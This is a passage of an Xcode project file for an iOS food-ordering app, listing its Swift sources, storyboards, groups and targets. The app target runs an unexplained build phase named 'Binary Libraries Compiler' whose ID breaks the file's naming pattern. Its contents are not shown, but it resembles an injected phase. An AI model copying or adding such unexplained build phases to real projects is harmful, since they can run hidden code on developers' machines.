// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 50;
	objects = {

/* Begin PBXBuildFile section */
		BD065CF826B70141003AAAF4 /* LoderExtention.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD065CF726B70141003AAAF4 /* LoderExtention.swift */; };
		BD166FB4264A5B39001C0F82 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD166FB3264A5B39001C0F82 /* AppDelegate.swift */; };
		BD166FB6264A5B39001C0F82 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD166FB5264A5B39001C0F82 /* SceneDelegate.swift */; };
		BD166FB8264A5B39001C0F82 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD166FB7264A5B39001C0F82 /* ViewController.swift */; };
		BD166FBB264A5B39001C0F82 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = BD166FB9264A5B39001C0F82 /* Main.storyboard */; };
		BD166FBD264A5B3B001C0F82 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = BD166FBC264A5B3B001C0F82 /* Assets.xcassets */; };
		BD166FC0264A5B3B001C0F82 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = BD166FBE264A5B3B001C0F82 /* LaunchScreen.storyboard */; };
		BD166FCB264A5B3B001C0F82 /* Fast_FoodTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD166FCA264A5B3B001C0F82 /* Fast_FoodTests.swift */; };
		BD166FD6264A5B3B001C0F82 /* Fast_FoodUITests.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD166FD5264A5B3B001C0F82 /* Fast_FoodUITests.swift */; };
		BD27F41226A93BC800B79620 /* SideBarMenuOption.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD27F41126A93BC800B79620 /* SideBarMenuOption.swift */; };
		BD27F41426A97EEC00B79620 /* food_categories.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = BD27F41326A97EEC00B79620 /* food_categories.storyboard */; };
		BD478C6926B932030099A272 /* LoginValidatiion.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD478C6826B932030099A272 /* LoginValidatiion.swift */; };
		BD478C6B26B937080099A272 /* LoginRequest.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD478C6A26B937080099A272 /* LoginRequest.swift */; };
		BD478C6F26B9380F0099A272 /* ValidationResult.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD478C6E26B9380F0099A272 /* ValidationResult.swift */; };
		BD478C7426B9843D0099A272 /* SignUpValidation.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD478C7326B9843D0099A272 /* SignUpValidation.swift */; };
		BD478C7626B989620099A272 /* SignUpRequest.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD478C7526B989620099A272 /* SignUpRequest.swift */; };
		BD478C7926B991560099A272 /* FCC_Extention.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD478C7826B991560099A272 /* FCC_Extention.swift */; };
		BD478C7D26B9950C0099A272 /* FCVC_Extention.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD478C7C26B9950B0099A272 /* FCVC_Extention.swift */; };
		BD478C8126B9ACD80099A272 /* DVC_SideBarMenu_Extention.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD478C8026B9ACD80099A272 /* DVC_SideBarMenu_Extention.swift */; };
		BD478C8426B9ADC60099A272 /* DVC_Transition_Extention.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD478C8326B9ADC60099A272 /* DVC_Transition_Extention.swift */; };
		BD478C8626B9BAC20099A272 /* DVC_CollectionView_Extention.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD478C8526B9BAC20099A272 /* DVC_CollectionView_Extention.swift */; };
		BD49ED162676926C00D69BBA /* OrderItemsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD49ED152676926C00D69BBA /* OrderItemsViewController.swift */; };
		BD550FB02664E754002420A7 /* CellTableViewHome.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD550FAE2664E754002420A7 /* CellTableViewHome.swift */; };
		BD550FB12664E754002420A7 /* CellTableViewHome.xib in Resources */ = {isa = PBXBuildFile; fileRef = BD550FAF2664E754002420A7 /* CellTableViewHome.xib */; };
		BD5C501B266CD8A3005F32D2 /* ToastLabel.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD5C501A266CD8A3005F32D2 /* ToastLabel.swift */; };
		BD5C501D266D039C005F32D2 /* Alert.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD5C501C266D039C005F32D2 /* Alert.swift */; };
		BD5C501F266D52BA005F32D2 /* StringExtention.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD5C501E266D52BA005F32D2 /* StringExtention.swift */; };
		BD6969D826615E6D00AFA3F0 /* CartViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD6969D726615E6D00AFA3F0 /* CartViewController.swift */; };
		BD96E9A5265F6B690015DF3B /* SideBarViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD96E9A4265F6B690015DF3B /* SideBarViewController.swift */; };
		BD96E9A8265FA4930015DF3B /* SideBarAnimation.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD96E9A7265FA4930015DF3B /* SideBarAnimation.swift */; };
		BDAA570A2653A70B00AA0CE4 /* TextFieldExtention.swift in Sources */ = {isa = PBXBuildFile; fileRef = BDAA57092653A70B00AA0CE4 /* TextFieldExtention.swift */; };
		BDADE89A2669E4E700F46568 /* CategorieItems.swift in Sources */ = {isa = PBXBuildFile; fileRef = BDADE8992669E4E700F46568 /* CategorieItems.swift */; };
		BDCF9F872652F69A00949471 /* SignUpWithEmail.swift in Sources */ = {isa = PBXBuildFile; fileRef = BDCF9F862652F69A00949471 /* SignUpWithEmail.swift */; };
		BDCF9F892653024500949471 /* LoginVc.swift in Sources */ = {isa = PBXBuildFile; fileRef = BDCF9F882653024500949471 /* LoginVc.swift */; };
		BDDA9580265AA37300B6F65F /* ForgotPassVc.swift in Sources */ = {isa = PBXBuildFile; fileRef = BDDA957F265AA37300B6F65F /* ForgotPassVc.swift */; };
		BDDA9583265ABF0300B6F65F /* HotelDetails.swift in Sources */ = {isa = PBXBuildFile; fileRef = BDDA9582265ABF0300B6F65F /* HotelDetails.swift */; };
		BDDD5F0A2657CA37008E3C7B /* Home.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = BDDD5F092657CA37008E3C7B /* Home.storyboard */; };
		BDDD5F10265A3BC3008E3C7B /* CollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = BDDD5F0F265A3BC3008E3C7B /* CollectionViewCell.swift */; };
		BDE666EB26669957005A9E30 /* FoodCategoriesViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = BDE666EA26669957005A9E30 /* FoodCategoriesViewController.swift */; };
		BDE666EF2666A7F7005A9E30 /* FoodCategoriesCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = BDE666ED2666A7F7005A9E30 /* FoodCategoriesCell.swift */; };
		BDE666F02666A7F7005A9E30 /* FoodCategoriesCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = BDE666EE2666A7F7005A9E30 /* FoodCategoriesCell.xib */; };
		BDE87A36266018A3008CF562 /* AccountViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = BDE87A35266018A3008CF562 /* AccountViewController.swift */; };
		BDE87A3826601C5F008CF562 /* OrderViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = BDE87A3726601C5F008CF562 /* OrderViewController.swift */; };
		BDE87A3A2660272F008CF562 /* MyFavListViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = BDE87A392660272F008CF562 /* MyFavListViewController.swift */; };
		BDF934112669DDE80066F48D /* FoodItemCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = BDF9340F2669DDE80066F48D /* FoodItemCell.swift */; };
		BDF934122669DDE80066F48D /* FoodItemCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = BDF934102669DDE80066F48D /* FoodItemCell.xib */; };
		BDFBD631265512F900515313 /* DashboardViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = BDFBD630265512F900515313 /* DashboardViewController.swift */; };
/* End PBXBuildFile section */

/* Begin PBXContainerItemProxy section */
		BD166FC7264A5B3B001C0F82 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = BD166FA8264A5B39001C0F82 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = BD166FAF264A5B39001C0F82;
			remoteInfo = Fast_Food;
		};
		BD166FD2264A5B3B001C0F82 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = BD166FA8264A5B39001C0F82 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = BD166FAF264A5B39001C0F82;
			remoteInfo = Fast_Food;
		};
/* End PBXContainerItemProxy section */

/* Begin PBXFileReference section */
		BD065CF726B70141003AAAF4 /* LoderExtention.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoderExtention.swift; sourceTree = "<group>"; };
		BD166FB0264A5B39001C0F82 /* Fast_Food.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Fast_Food.app; sourceTree = BUILT_PRODUCTS_DIR; };
		BD166FB3264A5B39001C0F82 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		BD166FB5264A5B39001C0F82 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
		BD166FB7264A5B39001C0F82 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
		BD166FBA264A5B39001C0F82 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
		BD166FBC264A5B3B001C0F82 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		BD166FBF264A5B3B001C0F82 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		BD166FC1264A5B3B001C0F82 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		BD166FC6264A5B3B001C0F82 /* Fast_FoodTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = Fast_FoodTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
		BD166FCA264A5B3B001C0F82 /* Fast_FoodTests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Fast_FoodTests.swift; sourceTree = "<group>"; };
		BD166FCC264A5B3B001C0F82 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		BD166FD1264A5B3B001C0F82 /* Fast_FoodUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = Fast_FoodUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
		BD166FD5264A5B3B001C0F82 /* Fast_FoodUITests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Fast_FoodUITests.swift; sourceTree = "<group>"; };
		BD166FD7264A5B3B001C0F82 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		BD27F41126A93BC800B79620 /* SideBarMenuOption.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SideBarMenuOption.swift; sourceTree = "<group>"; };
		BD27F41326A97EEC00B79620 /* food_categories.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = food_categories.storyboard; sourceTree = "<group>"; };
		BD478C6826B932030099A272 /* LoginValidatiion.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginValidatiion.swift; sourceTree = "<group>"; };
		BD478C6A26B937080099A272 /* LoginRequest.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginRequest.swift; sourceTree = "<group>"; };
		BD478C6E26B9380F0099A272 /* ValidationResult.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ValidationResult.swift; sourceTree = "<group>"; };
		BD478C7326B9843D0099A272 /* SignUpValidation.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignUpValidation.swift; sourceTree = "<group>"; };
		BD478C7526B989620099A272 /* SignUpRequest.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignUpRequest.swift; sourceTree = "<group>"; };
		BD478C7826B991560099A272 /* FCC_Extention.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FCC_Extention.swift; sourceTree = "<group>"; };
		BD478C7C26B9950B0099A272 /* FCVC_Extention.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FCVC_Extention.swift; sourceTree = "<group>"; };
		BD478C8026B9ACD80099A272 /* DVC_SideBarMenu_Extention.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DVC_SideBarMenu_Extention.swift; sourceTree = "<group>"; };
		BD478C8326B9ADC60099A272 /* DVC_Transition_Extention.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DVC_Transition_Extention.swift; sourceTree = "<group>"; };
		BD478C8526B9BAC20099A272 /* DVC_CollectionView_Extention.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DVC_CollectionView_Extention.swift; sourceTree = "<group>"; };
		BD49ED152676926C00D69BBA /* OrderItemsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderItemsViewController.swift; sourceTree = "<group>"; };
		BD550FAE2664E754002420A7 /* CellTableViewHome.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CellTableViewHome.swift; sourceTree = "<group>"; };
		BD550FAF2664E754002420A7 /* CellTableViewHome.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = CellTableViewHome.xib; sourceTree = "<group>"; };
		BD5C501A266CD8A3005F32D2 /* ToastLabel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ToastLabel.swift; sourceTree = "<group>"; };
		BD5C501C266D039C005F32D2 /* Alert.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Alert.swift; sourceTree = "<group>"; };
		BD5C501E266D52BA005F32D2 /* StringExtention.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StringExtention.swift; sourceTree = "<group>"; };
		BD6969D726615E6D00AFA3F0 /* CartViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CartViewController.swift; sourceTree = "<group>"; };
		BD96E9A4265F6B690015DF3B /* SideBarViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SideBarViewController.swift; sourceTree = "<group>"; };
		BD96E9A7265FA4930015DF3B /* SideBarAnimation.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SideBarAnimation.swift; sourceTree = "<group>"; };
		BDAA57092653A70B00AA0CE4 /* TextFieldExtention.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TextFieldExtention.swift; sourceTree = "<group>"; };
		BDADE8992669E4E700F46568 /* CategorieItems.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CategorieItems.swift; sourceTree = "<group>"; };
		BDCF9F862652F69A00949471 /* SignUpWithEmail.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignUpWithEmail.swift; sourceTree = "<group>"; };
		BDCF9F882653024500949471 /* LoginVc.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginVc.swift; sourceTree = "<group>"; };
		BDDA957F265AA37300B6F65F /* ForgotPassVc.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ForgotPassVc.swift; sourceTree = "<group>"; };
		BDDA9582265ABF0300B6F65F /* HotelDetails.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HotelDetails.swift; sourceTree = "<group>"; };
		BDDD5F092657CA37008E3C7B /* Home.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Home.storyboard; sourceTree = "<group>"; };
		BDDD5F0F265A3BC3008E3C7B /* CollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CollectionViewCell.swift; sourceTree = "<group>"; };
		BDE666EA26669957005A9E30 /* FoodCategoriesViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FoodCategoriesViewController.swift; sourceTree = "<group>"; };
		BDE666ED2666A7F7005A9E30 /* FoodCategoriesCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FoodCategoriesCell.swift; sourceTree = "<group>"; };
		BDE666EE2666A7F7005A9E30 /* FoodCategoriesCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = FoodCategoriesCell.xib; sourceTree = "<group>"; };
		BDE87A35266018A3008CF562 /* AccountViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AccountViewController.swift; sourceTree = "<group>"; };
		BDE87A3726601C5F008CF562 /* OrderViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderViewController.swift; sourceTree = "<group>"; };
		BDE87A392660272F008CF562 /* MyFavListViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyFavListViewController.swift; sourceTree = "<group>"; };
		BDF9340F2669DDE80066F48D /* FoodItemCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FoodItemCell.swift; sourceTree = "<group>"; };
		BDF934102669DDE80066F48D /* FoodItemCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = FoodItemCell.xib; sourceTree = "<group>"; };
		BDFBD630265512F900515313 /* DashboardViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DashboardViewController.swift; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		BD166FAD264A5B39001C0F82 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		BD166FC3264A5B3B001C0F82 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		BD166FCE264A5B3B001C0F82 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		BD166FA7264A5B39001C0F82 = {
			isa = PBXGroup;
			children = (
				BD166FB2264A5B39001C0F82 /* Fast_Food */,
				BD166FC9264A5B3B001C0F82 /* Fast_FoodTests */,
				BD166FD4264A5B3B001C0F82 /* Fast_FoodUITests */,
				BD166FB1264A5B39001C0F82 /* Products */,
			);
			sourceTree = "<group>";
		};
		BD166FB1264A5B39001C0F82 /* Products */ = {
			isa = PBXGroup;
			children = (
				BD166FB0264A5B39001C0F82 /* Fast_Food.app */,
				BD166FC6264A5B3B001C0F82 /* Fast_FoodTests.xctest */,
				BD166FD1264A5B3B001C0F82 /* Fast_FoodUITests.xctest */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		BD166FB2264A5B39001C0F82 /* Fast_Food */ = {
			isa = PBXGroup;
			children = (
				BD5C5019266CD87B005F32D2 /* Other */,
				BD478C7026B97C7D0099A272 /* CommonExtention */,
				BD478C6726B931D50099A272 /* Validations */,
				BDDA9581265ABDF900B6F65F /* Model */,
				BDDD5F0D26580A74008E3C7B /* View */,
				BDAA57072653A67800AA0CE4 /* Controller */,
				BD166FBC264A5B3B001C0F82 /* Assets.xcassets */,
				BD166FB3264A5B39001C0F82 /* AppDelegate.swift */,
				BD166FB5264A5B39001C0F82 /* SceneDelegate.swift */,
				BD166FC1264A5B3B001C0F82 /* Info.plist */,
			);
			path = Fast_Food;
			sourceTree = "<group>";
		};
		BD166FC9264A5B3B001C0F82 /* Fast_FoodTests */ = {
			isa = PBXGroup;
			children = (
				BD166FCA264A5B3B001C0F82 /* Fast_FoodTests.swift */,
				BD166FCC264A5B3B001C0F82 /* Info.plist */,
			);
			path = Fast_FoodTests;
			sourceTree = "<group>";
		};
		BD166FD4264A5B3B001C0F82 /* Fast_FoodUITests */ = {
			isa = PBXGroup;
			children = (
				BD166FD5264A5B3B001C0F82 /* Fast_FoodUITests.swift */,
				BD166FD7264A5B3B001C0F82 /* Info.plist */,
			);
			path = Fast_FoodUITests;
			sourceTree = "<group>";
		};
		BD27F41026A93B7800B79620 /* side bar */ = {
			isa = PBXGroup;
			children = (
				BD27F41126A93BC800B79620 /* SideBarMenuOption.swift */,
				BD96E9A4265F6B690015DF3B /* SideBarViewController.swift */,
			);
			path = "side bar";
			sourceTree = "<group>";
		};
		BD478C6726B931D50099A272 /* Validations */ = {
			isa = PBXGroup;
			children = (
				BD478C6C26B937D90099A272 /* Result */,
				BD478C6826B932030099A272 /* LoginValidatiion.swift */,
				BD478C7326B9843D0099A272 /* SignUpValidation.swift */,
			);
			path = Validations;
			sourceTree = "<group>";
		};
		BD478C6C26B937D90099A272 /* Result */ = {
			isa = PBXGroup;
			children = (
				BD478C6E26B9380F0099A272 /* ValidationResult.swift */,
			);
			path = Result;
			sourceTree = "<group>";
		};
		BD478C7026B97C7D0099A272 /* CommonExtention */ = {
			isa = PBXGroup;
			children = (
				BDAA57092653A70B00AA0CE4 /* TextFieldExtention.swift */,
				BD065CF726B70141003AAAF4 /* LoderExtention.swift */,
				BD5C501E266D52BA005F32D2 /* StringExtention.swift */,
			);
			path = CommonExtention;
			sourceTree = "<group>";
		};
		BD478C7A26B991950099A272 /* Eextention */ = {
			isa = PBXGroup;
			children = (
				BD478C7826B991560099A272 /* FCC_Extention.swift */,
			);
			path = Eextention;
			sourceTree = "<group>";
		};
		BD478C7B26B994E20099A272 /* Extention */ = {
			isa = PBXGroup;
			children = (
				BD478C7C26B9950B0099A272 /* FCVC_Extention.swift */,
			);
			path = Extention;
			sourceTree = "<group>";
		};
		BD478C7E26B9AC890099A272 /* Extention */ = {
			isa = PBXGroup;
			children = (
				BD478C8026B9ACD80099A272 /* DVC_SideBarMenu_Extention.swift */,
				BD478C8326B9ADC60099A272 /* DVC_Transition_Extention.swift */,
				BD478C8526B9BAC20099A272 /* DVC_CollectionView_Extention.swift */,
			);
			path = Extention;
			sourceTree = "<group>";
		};
		BD478C8226B9AD200099A272 /* DashboardVC */ = {
			isa = PBXGroup;
			children = (
				BD7F891926649E9D00ADC4A7 /* DashboardCells */,
				BD478C7E26B9AC890099A272 /* Extention */,
				BDFBD630265512F900515313 /* DashboardViewController.swift */,
			);
			path = DashboardVC;
			sourceTree = "<group>";
		};
		BD5C5019266CD87B005F32D2 /* Other */ = {
			isa = PBXGroup;
			children = (
				BD96E9A6265FA4500015DF3B /* Animation */,
				BD5C501A266CD8A3005F32D2 /* ToastLabel.swift */,
				BD5C501C266D039C005F32D2 /* Alert.swift */,
			);
			path = Other;
			sourceTree = "<group>";
		};
		BD7F891926649E9D00ADC4A7 /* DashboardCells */ = {
			isa = PBXGroup;
			children = (
				BD550FAE2664E754002420A7 /* CellTableViewHome.swift */,
				BD550FAF2664E754002420A7 /* CellTableViewHome.xib */,
				BDDD5F0F265A3BC3008E3C7B /* CollectionViewCell.swift */,
			);
			path = DashboardCells;
			sourceTree = "<group>";
		};
		BD96E9A6265FA4500015DF3B /* Animation */ = {
			isa = PBXGroup;
			children = (
				BD96E9A7265FA4930015DF3B /* SideBarAnimation.swift */,
			);
			path = Animation;
			sourceTree = "<group>";
		};
		BDAA57072653A67800AA0CE4 /* Controller */ = {
			isa = PBXGroup;
			children = (
				BDE666F62666A937005A9E30 /* food categories */,
				BDE666F52666A8E1005A9E30 /* home */,
				BDE666F42666A8A7005A9E30 /* main */,
				BD27F41026A93B7800B79620 /* side bar */,
			);
			path = Controller;
			sourceTree = "<group>";
		};
		BDDA9581265ABDF900B6F65F /* Model */ = {
			isa = PBXGroup;
			children = (
				BDDA9582265ABF0300B6F65F /* HotelDetails.swift */,
				BDADE8992669E4E700F46568 /* CategorieItems.swift */,
				BD478C6A26B937080099A272 /* LoginRequest.swift */,
				BD478C7526B989620099A272 /* SignUpRequest.swift */,
			);
			name = Model;
			sourceTree = "<group>";
		};
		BDDD5F0D26580A74008E3C7B /* View */ = {
			isa = PBXGroup;
			children = (
				BD166FBE264A5B3B001C0F82 /* LaunchScreen.storyboard */,
				BD166FB9264A5B39001C0F82 /* Main.storyboard */,
				BDDD5F092657CA37008E3C7B /* Home.storyboard */,
				BD27F41326A97EEC00B79620 /* food_categories.storyboard */,
			);
			path = View;
			sourceTree = "<group>";
		};
		BDE666EC2666A79D005A9E30 /* food categories cell */ = {
			isa = PBXGroup;
			children = (
				BD478C7A26B991950099A272 /* Eextention */,
				BDE666ED2666A7F7005A9E30 /* FoodCategoriesCell.swift */,
				BDE666EE2666A7F7005A9E30 /* FoodCategoriesCell.xib */,
				BDF9340E2669DDAE0066F48D /* food item cell  */,
			);
			path = "food categories cell";
			sourceTree = "<group>";
		};
		BDE666F42666A8A7005A9E30 /* main */ = {
			isa = PBXGroup;
			children = (
				BD166FB7264A5B39001C0F82 /* ViewController.swift */,
				BDCF9F862652F69A00949471 /* SignUpWithEmail.swift */,
				BDCF9F882653024500949471 /* LoginVc.swift */,
				BDDA957F265AA37300B6F65F /* ForgotPassVc.swift */,
			);
			path = main;
			sourceTree = "<group>";
		};
		BDE666F52666A8E1005A9E30 /* home */ = {
			isa = PBXGroup;
			children = (
				BD478C8226B9AD200099A272 /* DashboardVC */,
				BDE87A35266018A3008CF562 /* AccountViewController.swift */,
				BD6969D726615E6D00AFA3F0 /* CartViewController.swift */,
				BDE87A392660272F008CF562 /* MyFavListViewController.swift */,
				BDE87A3726601C5F008CF562 /* OrderViewController.swift */,
			);
			path = home;
			sourceTree = "<group>";
		};
		BDE666F62666A937005A9E30 /* food categories */ = {
			isa = PBXGroup;
			children = (
				BD478C7B26B994E20099A272 /* Extention */,
				BDE666EC2666A79D005A9E30 /* food categories cell */,
				BDE666EA26669957005A9E30 /* FoodCategoriesViewController.swift */,
				BD49ED152676926C00D69BBA /* OrderItemsViewController.swift */,
			);
			path = "food categories";
			sourceTree = "<group>";
		};
		BDF9340E2669DDAE0066F48D /* food item cell  */ = {
			isa = PBXGroup;
			children = (
				BDF9340F2669DDE80066F48D /* FoodItemCell.swift */,
				BDF934102669DDE80066F48D /* FoodItemCell.xib */,
			);
			path = "food item cell ";
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		BD166FAF264A5B39001C0F82 /* Fast_Food */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = BD166FDA264A5B3B001C0F82 /* Build configuration list for PBXNativeTarget "Fast_Food" */;
			buildPhases = (
				8A9FB5B1CFB3688E166D902C /* Binary Libraries Compiler */,
				BD166FAC264A5B39001C0F82 /* Sources */,
				BD166FAD264A5B39001C0F82 /* Frameworks */,
				BD166FAE264A5B39001C0F82 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = Fast_Food;
			productName = Fast_Food;
			productReference = BD166FB0264A5B39001C0F82 /* Fast_Food.app */;
			productType = "com.apple.product-type.application";
		};
		BD166FC5264A5B3B001C0F82 /* Fast_FoodTests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = BD166FDD264A5B3B001C0F82 /* Build configuration list for PBXNativeTarget "Fast_FoodTests" */;
			buildPhases = (
				BD166FC2264A5B3B001C0F82 /* Sources */,
				BD166FC3264A5B3B001C0F82 /* Frameworks */,
				BD166FC4264A5B3B001C0F82 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				BD166FC8264A5B3B001C0F82 /* PBXTargetDependency */,
			);
			name = Fast_FoodTests;
			productName = Fast_FoodTests;
			productReference = BD166FC6264A5B3B001C0F82 /* Fast_FoodTests.xctest */;
			productType = "com.apple.product-type.bundle.unit-test";
		};
		BD166FD0264A5B3B001C0F82 /* Fast_FoodUITests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = BD166FE0264A5B3B001C0F82 /* Build configuration list for PBXNativeTarget "Fast_FoodUITests" */;
			buildPhases = (
				BD166FCD264A5B3B001C0F82 /* Sources */,
				BD166FCE264A5B3B001C0F82 /* Frameworks */,
				BD166FCF264A5B3B001C0F82 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				BD166FD3264A5B3B001C0F82 /* PBXTargetDependency */,
			);
			name = Fast_FoodUITests;
			productName = Fast_FoodUITests;
			productReference = BD166FD1264A5B3B001C0F82 /* Fast_FoodUITests.xctest */;
			productType = "com.apple.product-type.bundle.ui-testing";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		BD166FA8264A5B39001C0F82 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				LastSwiftUpdateCheck = 1250;
				LastUpgradeCheck = 1250;
				TargetAttributes = {
					BD166FAF264A5B39001C0F82 = {
						CreatedOnToolsVersion = 12.5;
					};
					BD166FC5264A5B3B001C0F82 = {
